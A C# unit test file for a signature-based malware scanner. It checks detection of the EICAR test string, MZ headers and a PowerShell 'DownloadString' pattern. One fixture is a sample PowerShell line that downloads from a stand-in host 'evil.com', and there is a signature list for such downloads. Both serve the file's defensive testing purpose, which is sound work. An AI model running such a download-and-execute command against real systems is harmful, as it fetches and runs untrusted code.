// CustomSignatureScannerTests.cs
// カスタム署名スキャナーのユニットテスト

using System;
using System.IO;
using System.Text;
using System.Threading.Tasks;
using NonIPFileDelivery.Models;
using NonIPFileDelivery.Services;
using Xunit;
using Moq;

namespace NonIPFileDelivery.Tests
{
    public class CustomSignatureScannerTests : IDisposable
    {
        private readonly Mock<ILoggingService> _mockLogger;
        private readonly string _testSignaturePath;
        private readonly CustomSignatureScanner _scanner;

        public CustomSignatureScannerTests()
        {
            _mockLogger = new Mock<ILoggingService>();
            _testSignaturePath = Path.Combine(Path.GetTempPath(), $"test_signatures_{Guid.NewGuid()}.json");

            // テスト用の署名ファイルを作成
            CreateTestSignatureFile();

            _scanner = new CustomSignatureScanner(_mockLogger.Object, _testSignaturePath);
        }

        private void CreateTestSignatureFile()
        {
            var signatures = @"[
  {
    ""Id"": ""TEST-0001"",
    ""Name"": ""EICAR-Test-File"",
    ""HexPattern"": ""58354F2150254041505B345C505A58353428505E2937434329377D2445494341522D5354414E444152442D414E544956495255532D544553542D46494C452124482B482A"",
    ""Severity"": ""High"",
    ""Offset"": -1,
    ""MaxSearchSize"": 0,
    ""Description"": ""EICAR test file"",
    ""Enabled"": true
  },
  {
    ""Id"": ""TEST-0002"",
    ""Name"": ""PE-MZ-Header"",
    ""HexPattern"": ""4D5A"",
    ""Severity"": ""Low"",
    ""Offset"": 0,
    ""MaxSearchSize"": 2,
    ""Description"": ""DOS MZ header"",
    ""Enabled"": true
  },
  {
    ""Id"": ""TEST-0003"",
    ""Name"": ""Disabled-Signature"",
    ""HexPattern"": ""DEADBEEF"",
    ""Severity"": ""High"",
    ""Offset"": -1,
    ""MaxSearchSize"": 0,
    ""Description"": ""Should not trigger"",
    ""Enabled"": false
  },
  {
    ""Id"": ""TEST-0004"",
    ""Name"": ""PowerShell-DownloadString"",
    ""HexPattern"": ""446F776E6C6F6164537472696E67"",
    ""Severity"": ""High"",
    ""Offset"": -1,
    ""MaxSearchSize"": 0,
    ""Description"": ""PowerShell download"",
    ""Enabled"": true
  }
]";
            File.WriteAllText(_testSignaturePath, signatures, Encoding.UTF8);
        }

        [Fact]
        public void Constructor_ValidSignatureFile_LoadsSignatures()
        {
            // Arrange & Act
            // Constructor already called in setup

            // Assert
            Assert.Equal(3, _scanner.LoadedSignatureCount); // 3 enabled signatures
            Assert.Equal(0, _scanner.TotalScans);
        }

        [Fact]
        public void Scan_EmptyData_ReturnsClean()
        {
            // Arrange
            byte[] emptyData = Array.Empty<byte>();

            // Act
            var result = _scanner.Scan(emptyData, "empty.bin");

            // Assert
            Assert.True(result.IsClean);
            Assert.Contains("Empty data", result.Details);
        }

        [Fact]
        public void Scan_EICARTestFile_DetectsThreat()
        {
            // Arrange
            // EICAR test string: X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
            var eicarData = Encoding.ASCII.GetBytes("X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*");

            // Verify signatures are loaded
            Assert.True(_scanner.LoadedSignatureCount > 0, $"Expected signatures to be loaded, but count is {_scanner.LoadedSignatureCount}");

            // Act
            var result = _scanner.Scan(eicarData, "eicar.com");

            // Assert
            Assert.False(result.IsClean, $"Expected threat to be detected, but result was clean. Details: {result.Details}");
            Assert.Equal("EICAR-Test-File", result.ThreatName);
            Assert.Equal(ThreatLevel.High, result.Severity);
            Assert.Equal("TEST-0001", result.SignatureId);
            Assert.True(result.MatchOffset >= 0);
        }

        [Fact]
        public async Task ScanAsync_EICARTestFile_DetectsThreatAsync()
        {
            // Arrange
            var eicarData = Encoding.ASCII.GetBytes("X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*");

            // Act
            var result = await _scanner.ScanAsync(eicarData, "eicar.com");

            // Assert
            Assert.False(result.IsClean);
            Assert.Equal("EICAR-Test-File", result.ThreatName);
        }

        [Fact]
        public void Scan_MZHeader_DetectsAtCorrectOffset()
        {
            // Arrange
            // PE executable starts with "MZ" (0x4D 0x5A) at offset 0
            var peData = new byte[] { 0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00 };

            // Act
            var result = _scanner.Scan(peData, "test.exe");

            // Assert
            Assert.False(result.IsClean);
            Assert.Equal("PE-MZ-Header", result.ThreatName);
            Assert.Equal(0, result.MatchOffset); // Must be at offset 0
            Assert.Equal(ThreatLevel.Low, result.Severity);
        }

        [Fact]
        public void Scan_MZHeaderWrongOffset_DoesNotDetect()
        {
            // Arrange
            // MZ header at wrong position (offset 10 instead of 0)
            var data = new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x4D, 0x5A };

            // Act
            var result = _scanner.Scan(data, "test.bin");

            // Assert
            // Should not match because MZ signature has Offset=0, MaxSearchSize=2
            Assert.True(result.IsClean);
        }

        [Fact]
        public void Scan_PowerShellDownloadString_Detects()
        {
            // Arrange
            // "DownloadString" in ASCII
            var psData = Encoding.ASCII.GetBytes("Invoke-WebRequest -Uri http://evil.com | Out-File; DownloadString('malware.ps1')");

            // Act
            var result = _scanner.Scan(psData, "script.ps1");

            // Assert
            Assert.False(result.IsClean);
            Assert.Equal("PowerShell-DownloadString", result.ThreatName);
            Assert.True(result.MatchOffset > 0);
        }

        [Fact]
        public void Scan_DisabledSignature_DoesNotTrigger()
        {
            // Arrange
            // DEADBEEF pattern (disabled in signature)
            var data = new byte[] { 0xDE, 0xAD, 0xBE, 0xEF, 0x00, 0x00 };

            // Act
            var result = _scanner.Scan(data, "test.bin");

            // Assert
            Assert.True(result.IsClean); // Should not trigger disabled signature
        }

        [Fact]
        public void Scan_CleanFile_ReturnsClean()
        {
            // Arrange
            var cleanData = Encoding.ASCII.GetBytes("This is a perfectly clean text file with no malware.");

            // Act
            var result = _scanner.Scan(cleanData, "clean.txt");

            // Assert
            Assert.True(result.IsClean);
            Assert.Contains("No threats detected", result.Details);
        }

        [Fact]
        public void AddSignature_ValidSignature_IncreasesCount()
        {
            // Arrange
            var originalCount = _scanner.LoadedSignatureCount;
            var newSig = new MalwareSignature
            {
                Id = "TEST-9999",
                Name = "New-Test-Signature",
                HexPattern = "CAFEBABE",
                Severity = ThreatLevel.Medium,
                Enabled = true
            };

            // Act
            _scanner.AddSignature(newSig);

            // Assert
            Assert.Equal(originalCount + 1, _scanner.LoadedSignatureCount);
        }

        [Fact]
        public void RemoveSignature_ExistingSignature_RemovesSuccessfully()
        {
            // Arrange
            var newSig = new MalwareSignature
            {
                Id = "TEST-TEMP",
                Name = "Temporary-Signature",
                HexPattern = "12345678",
                Enabled = true
            };
            _scanner.AddSignature(newSig);

            // Act
            var removed = _scanner.RemoveSignature("TEST-TEMP");

            // Assert
            Assert.True(removed);
        }

        [Fact]
        public void RemoveSignature_NonExistingSignature_ReturnsFalse()
        {
            // Act
            var removed = _scanner.RemoveSignature("NON-EXISTENT-ID");

            // Assert
            Assert.False(removed);
        }

        [Fact]
        public void SetSignatureEnabled_ExistingSignature_ChangesState()
        {
            // Act
            var changed = _scanner.SetSignatureEnabled("TEST-0001", false);

            // Assert
            Assert.True(changed);
        }

        [Fact]
        public void ReloadSignatures_AfterFileChange_ReloadsSuccessfully()
        {
            // Arrange
            var originalCount = _scanner.LoadedSignatureCount;

            // Modify signature file (disable one signature)
            var signatures = File.ReadAllText(_testSignaturePath);
            var firstIndex = signatures.IndexOf(@"""Enabled"": true");
            if (firstIndex >= 0)
            {
                signatures = signatures.Substring(0, firstIndex) + @"""Enabled"": false" + signatures.Substring(firstIndex + @"""Enabled"": true".Length);
            }
            File.WriteAllText(_testSignaturePath, signatures);

            // Act
            _scanner.ReloadSignatures();

            // Assert
            Assert.True(_scanner.LoadedSignatureCount < originalCount);
        }

        [Fact]
        public void GetAllSignatures_ReturnsAllLoadedSignatures()
        {
            // Act
            var signatures = _scanner.GetAllSignatures();

            // Assert
            Assert.NotNull(signatures);
            Assert.True(signatures.Count >= 3); // At least 3 test signatures
        }

        [Fact]
        public void GetStats_ReturnsStatisticsString()
        {
            // Arrange
            _scanner.Scan(new byte[] { 0x00 }, "test.bin");

            // Act
            var stats = _scanner.GetStats();

            // Assert
            Assert.Contains("CustomSignatureScanner Stats", stats);
            Assert.Contains("Scans=", stats);
        }

        [Fact]
        public void Scan_LargeFile_CompletesWithinReasonableTime()
        {
            // Arrange
            var largeData = new byte[10 * 1024 * 1024]; // 10 MB
            new Random().NextBytes(largeData);

            // Act
            var result = _scanner.Scan(largeData, "large.bin", timeoutMs: 10000);

            // Assert
            Assert.NotNull(result);
            Assert.True(result.ScanDuration.TotalSeconds < 10);
        }

        [Fact]
        public void Scan_MultiplePatterns_DetectsFirstMatch()
        {
            // Arrange
            // Data containing both EICAR and MZ header
            var mixedData = new byte[] { 0x4D, 0x5A }; // MZ first in data
            var eicarBytes = Encoding.ASCII.GetBytes("X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*");
            var combined = new byte[mixedData.Length + eicarBytes.Length];
            mixedData.CopyTo(combined, 0);
            eicarBytes.CopyTo(combined, mixedData.Length);

            // Act
            var result = _scanner.Scan(combined, "mixed.bin");

            // Assert
            Assert.False(result.IsClean);
            // Scans in signature order (EICAR is first in signatures.json), so EICAR detected first
            Assert.Equal("EICAR-Test-File", result.ThreatName);
        }

        [Fact]
        public void Constructor_NonExistentFile_CreatesEmptyScanner()
        {
            // Arrange
            var nonExistentPath = Path.Combine(Path.GetTempPath(), $"non_existent_{Guid.NewGuid()}.json");
            var mockLogger = new Mock<ILoggingService>();

            // Act
            var scanner = new CustomSignatureScanner(mockLogger.Object, nonExistentPath);

            // Assert
            Assert.Equal(0, scanner.LoadedSignatureCount);
        }

        public void Dispose()
        {
            _scanner?.Dispose();

            if (File.Exists(_testSignaturePath))
            {
                File.Delete(_testSignaturePath);
            }
        }
    }
}
